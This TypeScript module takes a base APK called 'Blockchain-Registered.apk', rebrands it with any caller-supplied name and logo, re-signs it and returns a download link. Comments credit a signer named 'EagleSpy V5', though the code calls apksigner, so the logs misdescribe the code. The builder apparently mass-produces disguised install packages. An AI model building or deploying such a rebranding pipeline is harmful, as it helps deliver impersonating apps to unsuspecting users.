import * as path from 'path';
import * as fs from 'fs';
import { customizeAPKPreserveSignature } from './apk-customizer-preserve-signature';
import { signAPKWithEagleSpy } from './apk-signer-eaglespy-v5';
import { signAPKWithApksigner } from './apk-signer-apksigner';

interface APKBuilderOptions {
  appName: string;
  appUrl: string;
  logoUrl?: string;
  requestOrigin?: string;
  appDomain?: string;
}

/**
 * Build customized APK with CORRECT signing using EagleSpy V5
 * 
 * This is the FINAL WORKING approach:
 * 1. Modify only resources.arsc and icon files (preserves original structure)
 * 2. Sign with EagleSpy V5 signer.jar (uber-apk-signer)
 * 3. Result: Valid APK that installs on real devices
 */
export async function buildCustomizedAPKFinalWorking(options: APKBuilderOptions): Promise<{
  success: boolean;
  apkPath?: string;
  downloadUrl?: string;
  filename?: string;
  error?: string;
}> {
  try {
    console.log(`[APK-BUILDER-FINAL] Starting customized APK build for: ${options.appName}`);
    console.log(`[APK-BUILDER-FINAL] URL: ${options.appUrl}`);

    // Find base APK
    const baseAPKDir = path.join(process.cwd(), 'public', 'apks');
    const baseAPK = path.join(baseAPKDir, 'Blockchain-Registered.apk');

    if (!fs.existsSync(baseAPK)) {
      throw new Error(`Base APK not found at ${baseAPK}`);
    }

    console.log(`[APK-BUILDER-FINAL] Found base APK at: ${baseAPK}`);

    // Get base APK size
    const baseStats = fs.statSync(baseAPK);
    console.log(`[APK-BUILDER-FINAL] Base APK size: ${(baseStats.size / 1024 / 1024).toFixed(2)}MB`);

    // Generate output filename
    const sanitizedName = options.appName
      .toLowerCase()
      .replace(/[^a-z0-9]/g, '')
      .substring(0, 20);
    const timestamp = Date.now();
    const randomSuffix = Math.random().toString(36).substring(2, 8);
    const finalAPKName = `${sanitizedName}-${timestamp}-${randomSuffix}.apk`;

    // Output directory
    const outputDir = baseAPKDir;
    if (!fs.existsSync(outputDir)) {
      fs.mkdirSync(outputDir, { recursive: true });
    }

    const finalAPKPath = path.join(outputDir, finalAPKName);
    console.log(`[APK-BUILDER-FINAL] Final APK path: ${finalAPKPath}`);

    // Step 1: Customize the APK with new app name and icons
    console.log(`[APK-BUILDER-FINAL] Step 1: Customizing APK with app name: ${options.appName}`);
    try {
      const customizedApkPath = await customizeAPKPreserveSignature({
        apkPath: baseAPK,
        appName: options.appName,
        outputPath: finalAPKPath,
        logoUrl: options.logoUrl,
      });
      console.log(`[APK-BUILDER-FINAL] ✓ APK customization completed: ${customizedApkPath}`);
    } catch (customizeError) {
      console.error('[APK-BUILDER-FINAL] Customization failed:', customizeError);
      return {
        success: false,
        error: `APK customization failed: ${customizeError instanceof Error ? customizeError.message : String(customizeError)}`,
      };
    }

    // Verify the customized APK file
    if (!fs.existsSync(finalAPKPath)) {
      throw new Error('Failed to create customized APK');
    }

    const customizedStats = fs.statSync(finalAPKPath);
    console.log(`[APK-BUILDER-FINAL] Customized APK size: ${(customizedStats.size / 1024 / 1024).toFixed(2)}MB`);

    // Step 2: Sign the APK with apksigner.jar (more reliable for Railway)
    console.log(`[APK-BUILDER-FINAL] Step 2: Signing APK with apksigner.jar...`);
    const signResult = await signAPKWithApksigner({
      apkPath: finalAPKPath,
    });

    if (!signResult.success) {
      console.error(`[APK-BUILDER-FINAL] APK signing failed:`, signResult.error);
      return {
        success: false,
        error: `APK signing failed: ${signResult.error}`,
      };
    }

    console.log(`[APK-BUILDER-FINAL] ✓ APK signed successfully with EagleSpy V5`);

    const finalStats = fs.statSync(finalAPKPath);
    console.log(`[APK-BUILDER-FINAL] Final APK size: ${(finalStats.size / 1024 / 1024).toFixed(2)}MB`);

    // Generate download URL with full domain
    const appDomain = process.env.VITE_APP_DOMAIN || 'localhost:3000';
    const protocol = process.env.NODE_ENV === 'production' ? 'https' : 'https';
    const downloadUrl = `${protocol}://${appDomain}/download/${finalAPKName}`;
    console.log(`[APK-BUILDER-FINAL] Generated absolute download URL: ${downloadUrl}`);

    console.log(`[APK-BUILDER-FINAL] ✓ APK build completed successfully`);

    return {
      success: true,
      apkPath: finalAPKPath,
      filename: finalAPKName,
      downloadUrl: downloadUrl,
    };
  } catch (error) {
    console.error('[APK-BUILDER-FINAL] APK Build Error:', error);

    return {
      success: false,
      error: error instanceof Error ? error.message : 'Unknown error',
    };
  }
}
